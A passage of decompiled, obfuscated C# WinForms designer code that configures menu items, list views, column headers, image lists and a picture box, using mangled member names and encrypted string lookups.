			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125375));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().Name = global::\u0006\u2001.\u0002(-1829123534);
			ToolStripItem toolStripItem20 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001();
			size = new Size(170, 22);
			toolStripItem20.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().Text = global::\u0006\u2001.\u0002(-1829122143);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141460));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().Name = global::\u0006\u2001.\u0002(-1829141496);
			ToolStripItem toolStripItem21 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001();
			size = new Size(170, 22);
			toolStripItem21.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().Text = global::\u0006\u2001.\u0002(-1829141398);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125278));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().Name = global::\u0006\u2001.\u0002(-1829123248);
			ToolStripItem toolStripItem22 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001();
			size = new Size(170, 22);
			toolStripItem22.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().Text = global::\u0006\u2001.\u0002(-1829139985);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125312));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().Name = global::\u0006\u2001.\u0002(-1829125185);
			ToolStripItem toolStripItem23 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001();
			size = new Size(170, 22);
			toolStripItem23.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().Text = global::\u0006\u2001.\u0002(-1829125244);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125222));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().Name = global::\u0006\u2001.\u0002(-1829125129);
			ToolStripItem toolStripItem24 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001();
			size = new Size(170, 22);
			toolStripItem24.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().Text = global::\u0006\u2001.\u0002(-1829125158);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125586));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().Name = global::\u0006\u2001.\u0002(-1829125624);
			ToolStripItem toolStripItem25 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002();
			size = new Size(170, 22);
			toolStripItem25.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().Text = global::\u0006\u2001.\u0002(-1829125528);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125511));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().Name = global::\u0006\u2001.\u0002(-1829125547);
			ToolStripItem toolStripItem26 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002();
			size = new Size(170, 22);
			toolStripItem26.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().Text = global::\u0006\u2001.\u0002(-1829125449);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125494));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().Name = global::\u0006\u2001.\u0002(-1829125408);
			ToolStripItem toolStripItem27 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002();
			size = new Size(170, 22);
			toolStripItem27.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().Text = global::\u0006\u2001.\u0002(-1829125412);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125849));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().Name = global::\u0006\u2001.\u0002(-1829125888);
			ToolStripItem toolStripItem28 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002();
			size = new Size(170, 22);
			toolStripItem28.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().Text = global::\u0006\u2001.\u0002(-1829125761);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141379));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().Name = global::\u0006\u2001.\u0002(-1829141419);
			ToolStripItem toolStripItem29 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002();
			size = new Size(170, 22);
			toolStripItem29.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().Text = global::\u0006\u2001.\u0002(-1829125810);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125799));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().Name = global::\u0006\u2001.\u0002(-1829125704);
			ToolStripItem toolStripItem30 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002();
			size = new Size(170, 22);
			toolStripItem30.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().Text = global::\u0006\u2001.\u0002(-1829125731);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125741));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002().Name = global::\u0006\u2001.\u0002(-1829125648);
			ToolStripItem toolStripItem31 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002();
			size = new Size(170, 22);
			toolStripItem31.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002().Text = global::\u0006\u2001.\u0002(-1829125677);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829126105));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003().Name = global::\u0006\u2001.\u0002(-1829126117);
			ToolStripItem toolStripItem32 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003();
			size = new Size(170, 22);
			toolStripItem32.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003().Text = global::\u0006\u2001.\u0002(-1829126027);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ColorDepth = ColorDepth.Depth32Bit;
			ImageList imageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			size = new Size(20, 20);
			imageList.ImageSize = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().TransparentColor = Color.Transparent;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BorderStyle = BorderStyle.FixedSingle;
			Control control23 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(205, 141);
			control23.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829129003);
			Control control24 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(293, 187);
			control24.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SizeMode = PictureBoxSizeMode.Zoom;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 6;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabStop = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Dock = DockStyle.Top;
			Control control25 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			location = new Point(187, 0);
			control25.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829130215);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ReadOnly = true;
			Control control26 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			size = new Size(0, 20);
			control26.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().TabIndex = 3;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().BackColor = Color.White;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Name = global::\u0006\u2001.\u0002(-1829141617);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().RenderMode = ToolStripRenderMode.Professional;
			Control control27 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006();
			size = new Size(119, 26);
			control27.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829126050));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000().Name = global::\u0006\u2001.\u0002(-1829125959);
			ToolStripItem toolStripItem33 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000();
			size = new Size(118, 22);
			toolStripItem33.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000().Text = global::\u0006\u2001.\u0002(-1829123113);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ImageStream = (ImageListStreamer)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829125990));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().TransparentColor = Color.Transparent;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images.SetKeyName(0, global::\u0006\u2001.\u0002(-1829122489));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images.SetKeyName(1, global::\u0006\u2001.\u0002(-1829125915));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images.SetKeyName(2, global::\u0006\u2001.\u0002(-1829125900));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images.SetKeyName(3, global::\u0006\u2001.\u0002(-1829125951));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images.SetKeyName(4, global::\u0006\u2001.\u0002(-1829124305));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images.SetKeyName(5, global::\u0006\u2001.\u0002(-1829124290));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Columns.AddRange(new ColumnHeader[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().FullRowSelect = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().LargeImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			Control control28 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			location = new Point(187, 20);
			control28.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Name = global::\u0006\u2001.\u0002(-1829124341);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().OwnerDraw = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ShowItemToolTips = true;
			Control control29 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			size = new Size(0, 22);
			control29.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SmallImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().TabIndex = 4;
			ListView listView2 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			size = new Size(60, 40);
			listView2.TileSize = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().View = View.Details;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().Text = global::\u0006\u2001.\u0002(-1829136393);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().Width = 165;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().Text = global::\u0006\u2001.\u0002(-1829139076);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().Width = 93;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().Text = global::\u0006\u2001.\u0002(-1829124350);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().Width = 39;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Columns.AddRange(new ColumnHeader[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Dock = DockStyle.Left;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().FullRowSelect = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().LargeImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			Control control30 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			location = new Point(0, 0);
			control30.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Name = global::\u0006\u2001.\u0002(-1829136589);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().OwnerDraw = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().ShowItemToolTips = true;
			Control control31 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			size = new Size(187, 42);
			control31.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().SmallImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().TabIndex = 5;
			ListView listView3 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			size = new Size(60, 40);
			listView3.TileSize = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().View = View.Details;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().Text = global::\u0006\u2001.\u0002(-1829136393);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001().Width = 106;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().Text = global::\u0006\u2001.\u0002(-1829124350);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001().Width = 77;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Columns.AddRange(new ColumnHeader[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().FullRowSelect = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().LargeImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			Control control32 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E();
			location = new Point(200, 0);
			control32.Location = location;
